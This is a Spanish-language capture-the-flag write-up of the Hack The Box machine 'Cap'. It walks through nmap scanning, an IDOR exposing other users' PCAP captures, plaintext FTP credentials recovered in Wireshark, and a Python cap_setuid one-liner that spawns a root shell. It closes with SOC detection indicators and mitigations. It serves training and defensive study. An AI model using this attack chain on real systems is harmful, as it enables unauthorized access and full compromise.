# HTB - Cap (IDOR + Análisis de tráfico + Linux Capabilities)

---

## Recopilación de información

<aside>
💡

### Fase de enumeración

Se inicia el laboratorio realizando reconocimiento de red para identificar servicios expuestos en la máquina objetivo.

El escaneo inicial revela múltiples servicios accesibles, destacando especialmente:

* **21 (FTP)**
* **22 (SSH)**
* **80 (HTTP)**

El servicio web se prioriza como vector principal de ataque.

</aside>

---

### Comandos de enumeración

```bash id="enum01"
sudo nmap -p- -sS --min-rate 5000 -Pn IP -oN puertos.txt
```

```bash id="enum02"
sudo nmap -p21,22,80 -sCV IP -oN servicios.txt
```

<aside>
💡

No se identifican vulnerabilidades directas mediante scripts automatizados, por lo que se continúa con enumeración manual.

</aside>

---

## Análisis del servicio web

<aside>
💡

Al acceder al puerto 80, se observa una aplicación web que permite generar **“Security Snapshots”**, los cuales producen archivos `.pcap` con capturas de tráfico.

Cada snapshot es accesible mediante una URL con estructura:

</aside>

```text id="web01"
/data/[id]
```

---

## Identificación de vulnerabilidad (IDOR)

<aside>
💡

Se detecta que el parámetro `[id]` es incremental y puede modificarse manualmente sin control de acceso.

</aside>

```text id="web02"
/data/0
/data/1
/data/2
```

Esto permite acceder a datos de otros usuarios.

---

### Vulnerabilidad detectada

```text id="web03"
IDOR (Insecure Direct Object Reference)
```

<aside>
💡

La aplicación no valida que el recurso solicitado pertenezca al usuario autenticado, permitiendo acceso no autorizado a información sensible.

</aside>

---

## Análisis de archivo PCAP

Se descarga un archivo:

```bash id="pcap01"
wireshark archivo.pcap
```

<aside>
💡

Durante el análisis del tráfico se detecta:

* Tráfico FTP
* Credenciales transmitidas en texto plano

</aside>

---

### Hallazgos

```text id="pcap02"
usuario: XXXX
password: XXXX
```

<aside>
💡

FTP transmite credenciales sin cifrado, lo que permite su captura mediante análisis de tráfico.

</aside>

---

## Acceso inicial

```bash id="access01"
ssh usuario@IP
```

Se obtiene acceso como usuario estándar.

```bash id="access02"
whoami
id
```

---

## Enumeración local

Se analizan posibles vectores de escalada:

```bash id="enum_local01"
sudo -l
```

```bash id="enum_local02"
find / -perm -4000 2>/dev/null
```

No se identifican vectores directos.

---

### Análisis de capabilities

```bash id="enum_local03"
getcap -r / 2>/dev/null
```

Resultado:

```text id="enum_local04"
/usr/bin/python3.8 = cap_setuid+ep
```

---

## Escalada de privilegios

<aside>
💡

El binario Python posee la capability `cap_setuid`, lo que permite cambiar el UID efectivo del proceso.

Esto está mal configurado y permite ejecución como root.

</aside>

```bash id="priv01"
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash id="priv02"
id
```

Resultado:

```text id="priv03"
uid=0(root)
```

---

## Análisis del ataque (ofensivo)

Cadena de ataque:

1. Enumeración de servicios
2. Identificación de endpoint vulnerable
3. Explotación IDOR
4. Obtención de archivo PCAP
5. Extracción de credenciales
6. Acceso SSH
7. Escalada mediante Linux Capabilities

---

## Enfoque SOC (detección)

<aside>
💡

Este laboratorio es especialmente relevante para SOC, ya que combina vulnerabilidades web, análisis de tráfico y escalada local.

</aside>

---

### Indicadores de compromiso (IoC)

* Acceso a múltiples IDs en `/data/*`
* Descarga masiva de archivos PCAP
* Credenciales utilizadas desde IP sospechosa
* Conexiones SSH inusuales
* Ejecución de procesos privilegiados inesperados

---

### Logs relevantes

* **Web server logs (Apache/Nginx)**
* **Auth logs (/var/log/auth.log)**
* **Network logs (PCAP / NetFlow)**
* **SIEM correlación de eventos web + autenticación**

---

### Detección en entorno real

Un SOC podría detectar este ataque mediante:

* Alertas por comportamiento IDOR (acceso a múltiples recursos)
* Análisis de tráfico anómalo
* Detección de credenciales en texto plano
* Monitorización de accesos SSH
* Alertas por escalada de privilegios

---

## Enfoque SOC (mitigación y prevención)

<aside>
💡

La cadena de ataque se basa en múltiples fallos de seguridad combinados.

</aside>

---

### Medidas técnicas

* Implementar control de acceso en endpoints (`/data`)
* Validar autorización de usuarios
* Deshabilitar FTP o usar **SFTP/FTPS**
* Eliminar capabilities peligrosas (`cap_setuid`)
* Hardening del sistema

---

### Medidas de detección

* SIEM con alertas de acceso anómalo a endpoints
* Monitorización de tráfico en texto plano
* EDR para detectar ejecución de procesos privilegiados
* Detección de escalada de privilegios

---

### Medidas organizativas

* Auditorías de aplicaciones web
* Formación en desarrollo seguro (evitar IDOR)
* Políticas de cifrado en comunicaciones

---

## Impacto real

<aside>
💡

Este tipo de ataque permite:

* Acceso a información sensible
* Compromiso de cuentas
* Escalada a root
* Persistencia en el sistema

</aside>

---

## Conclusión

<aside>
💡

La máquina Cap demuestra cómo una cadena de vulnerabilidades aparentemente simples puede derivar en un compromiso total del sistema.

No se explota una única vulnerabilidad crítica, sino una combinación de:

* Mala validación de acceso (IDOR)
* Uso de protocolos inseguros (FTP)
* Configuración incorrecta del sistema (capabilities)

Desde una perspectiva SOC, este tipo de ataque es altamente detectable si existe:

* Monitorización de logs
* Correlación de eventos
* Análisis de tráfico

</aside>

---
